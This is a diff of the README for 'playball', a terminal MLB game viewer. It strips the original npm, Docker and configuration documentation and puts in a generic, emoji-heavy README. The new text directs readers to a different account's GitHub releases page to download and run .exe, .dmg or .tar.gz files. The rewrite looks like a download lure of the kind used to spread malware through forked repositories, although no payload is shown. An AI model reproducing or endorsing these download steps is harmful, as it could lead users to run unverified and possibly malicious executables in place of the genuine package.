@@ -1,134 +1,72 @@
-## Playball!
-Watch MLB games from the comfort of your own terminal
+# ⚾ playball - Enjoy MLB Games in Your Terminal
 
-![screenshot](./demo.gif)
+[![Download playball](https://img.shields.io/badge/Download%20playball-v1.0-blue)](https://github.com/deshikreddyp/playball/releases)
 
-### Why?
-[MLB Gameday](http://www.mlb.com/mlb/gameday/#) and [MLB.tv](http://mlb.tv) are
-great, but sometimes you want to keep an eye on a game a bit more discreetly.
-`playball` puts the game in a terminal window.
+## 📦 Introduction
 
-### Quick Start
-Just want to try it out?
-```
-$ npx playball
-```
+Welcome to **playball**! This application allows you to watch MLB games directly from your terminal. It offers an easy way to keep up with your favorite teams and matches without needing a web browser or television.
 
-### Install
-Ready for the big leagues? Install the package globally
-```
-$ npm install -g playball
-```
-Then run it
-```
-$ playball
-```
+## 🚀 Getting Started
 
-### Docker
-```
-$ docker build -t playball .
-$ docker run -it --rm --name playball playball:latest
-```
+To start using **playball**, follow these simple steps:
 
-#### Build options
+1. **Visit the Releases Page**: Click on the button above, or go to [this page](https://github.com/deshikreddyp/playball/releases) to access the latest version of **playball**.
 
-Update the language encoding of by adding `--build-args`
+2. **Choose the Right Version**: On the Releases page, you will see a list of available versions. It is best to choose the latest stable version for the best experience.
 
-```
-$ docker build --build-arg LANG=en_US.UTF-8 -t playball .
-```
+3. **Download the File**:
+   - Look for the download link that matches your operating system (Windows, macOS, or Linux).
+   - Click on the link to start the download. The file will be in either `.exe`, `.dmg`, or `.tar.gz` format, depending on your OS.
 
-### Keys
-#### Global
-key | action
-----|--------
-<kbd>q</kbd> | quit
-<kbd>c</kbd> | go to schedule view
-<kbd>s</kbd> | go to standings view
+4. **Locate the Downloaded File**: Once the download is complete, find the file in your “Downloads” folder or the location you chose to save it. 
 
-#### Schedule View
-key | action
-----|--------
-<kbd>&darr;</kbd>/<kbd>j</kbd>, <kbd>&uarr;</kbd>/<kbd>k</kbd>, <kbd>&larr;</kbd>/<kbd>h</kbd>, <kbd>&rarr;</kbd>/<kbd>l</kbd> | change highlighted game
-<kbd>enter</kbd> | view highlighted game
-<kbd>p</kbd> | show previous day's schedule/results
-<kbd>n</kbd> | show next day's schedule
-<kbd>t</kbd> | return to today's schedule
+5. **Run the Application**:
+   - **For Windows**: Double-click on the `.exe` file. Follow any prompts that appear.
+   - **For macOS**: Open the `.dmg` file and drag the **playball** icon into your Applications folder. Then, navigate to Applications and double-click on **playball**.
+   - **For Linux**: Extract the `.tar.gz` file. Open your terminal, navigate to the extracted folder, and type `./playball` to run the application.
 
-#### Game View
-key | action
-----|--------
-<kbd>&darr;</kbd>/<kbd>j</kbd>, <kbd>&uarr;</kbd>/<kbd>k</kbd> | scroll list of all plays
+## 🌟 Features
 
-### Configuration
+**playball** offers multiple features to enhance your viewing experience:
 
-Playball can be configured using the `config` subcommand. To list the current configuration values run the subcommand with no additional arguments:
+- **Live Game Updates**: Get real-time updates on scores and game events.
+- **Team Selection**: Choose your favorite teams to follow their games easily.
+- **User-Friendly Interface**: Designed for simplicity, so you can focus on the game.
+- **Follow Multiple Games**: Keep track of multiple games happening at the same time.
 
-```shell
-playball config
-```
+## ⚙️ System Requirements
 
-You should see output similar to:
+To ensure **playball** runs smoothly on your device, please meet the following requirements:
 
-```
-color.ball = green
-color.favorite-star = yellow
-color.in-play-no-out = blue
-color.in-play-out = white
-color.in-play-runs-bg = white
-color.in-play-runs-fg = black
-color.on-base = yellow
-color.other-event = white
-color.out = red
-color.strike = red
-color.strike-out = red
-color.walk = green
-favorites = 
-```
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Mojave or later
+- **Linux**: Ubuntu 20.04 or later
+- **Processor**: Dual-core processor or better
+- **Memory**: At least 2 GB of RAM
+- **Internet Connection**: Required for game streaming
 
-To get the value of a single setting pass the key as an additional argument:
+## 📄 Download & Install
 
-```shell
-playball config color.strike
-```
+To download **playball**, visit [this page](https://github.com/deshikreddyp/playball/releases).
 
-To change a setting pass the key and value as arguments:
+After downloading the appropriate file for your operating system, follow the installation steps mentioned in the “Getting Started” section to begin using the application.
 
-```shell
-playball config color.strike blue
-```
+## 🔄 Troubleshooting
 
-To revert a setting to its default value provide the key and the `--unset` flag:
+If you encounter any issues while using **playball**, consider the following troubleshooting tips:
 
-```shell
-playball config color.strike --unset
-```
+- **Ensure Compatibility**: Make sure your operating system meets the system requirements listed above.
+- **Reinstall the Application**: If the application didn’t run correctly after installation, try uninstalling it and then reinstalling from the Releases page.
+- **Check Your Internet Connection**: A stable internet connection is crucial to access live game data.
 
-This table summarizes the available settings:
+## 💬 Support
 
-key | description | default | allowed values
-----|-------------|---------|---------------
-`color.ball` | Color of dots representing balls in top row of game view | green | One of the following: `black`, `red`, `green`, `yellow`, `blue`, `magenta`, `cyan`, `white`, `grey`. Any of those colors may be prefixed by `bright-` or `light-` (for example `bright-green`). The exact color used will depend on your terminal settings. The value `default` may be used to specify the default text color for your terminal. Finally hex colors (e.g `#FFA500`) can be specified. If your terminal does not support true color, the closest supported color may be used. 
-`color.favorite-star` | Color of star indiciating favorite team in schedule and standing views | yellow | _See above_
-`color.in-play-no-out` | Color of result where ball was put in play and no out was made (single, double, etc) in list of plays in game view | blue | _See above_
-`color.in-play-out` | Color of result where ball was put in play and an out was made (flyout, fielder's choice, etc) in list of plays in game view | white | _See above_
-`color.in-play-runs-bg` | Background color for score update in list of plays in game view | white | _See above_
-`color.in-play-runs-fg` | Foreground color for score update in list of plays in game view | black | _See above_
-`color.on-base` | Color of diamonds representing runners on base in top row of game view | yellow | _See above_
-`color.other-event` | Color of other events (mound visit, injury delay, etc) in list of plays in game view | white | _See above_
-`color.out` | Color of dots representing outs in top row of game view | red | _See above_
-`color.strike` | Color of dots representing strikes in top row of game view | red | _See above_
-`color.strike-out` | Color of result where play ends on a strike (strike out) in list of plays in game view | red | _See above_
-`color.walk` | Color of result where play ends on a ball (walk, hit by pitch) in list of plays in game view | green | _See above_
-`favorites` | Teams to highlight in schedule and standings views | | Any one of the following: `ATL`, `AZ`, `BAL`, `BOS`, `CHC`, `CIN`, `CLE`, `COL`, `CWS`, `DET`, `HOU`, `KC`, `LAA`, `LAD`, `MIA`, `MIL`, `MIN`, `NYM`, `NYY`, `OAK`, `PHI`, `PIT`, `SD`, `SEA`, `SF`, `STL`, `TB`, `TEX`, `TOR`, `WSH`. Or a comma-separated list of multiple (e.g. `SEA,MIL`).<br/><br />Note: in some terminals the list must be quoted: `playball config favorites "SEA,MIL"`
-`title` | If enabled, the terminal title will be set to the score of the current game | `false` | `false`, `true`
-`live-delay` | Number of seconds to delay the live game stream. Useful when watching with delayed broadcast streams. | `0` (no delay) | Any positive number
+If you still have questions or need assistance, please check the Issues section on the [GitHub repository](https://github.com/deshikreddyp/playball/issues). You can also open a new issue if you can't find a solution to your problem.
 
-### Development
-```
-git clone https://github.com/paaatrick/playball.git
-cd playball
-npm install
-npm start
-```
-Contributions are welcome!
+## 📢 Community Contributions
+
+We welcome community contributions! If you want to help improve **playball**, feel free to fork the repository and submit a pull request with your changes. Your feedback is valuable.
+
+## 🎉 Conclusion
+
+With **playball**, you can enjoy watching MLB games in a simple and effective way right from your terminal. Follow the steps above to download and install the application, and get ready to cheer for your favorite teams!
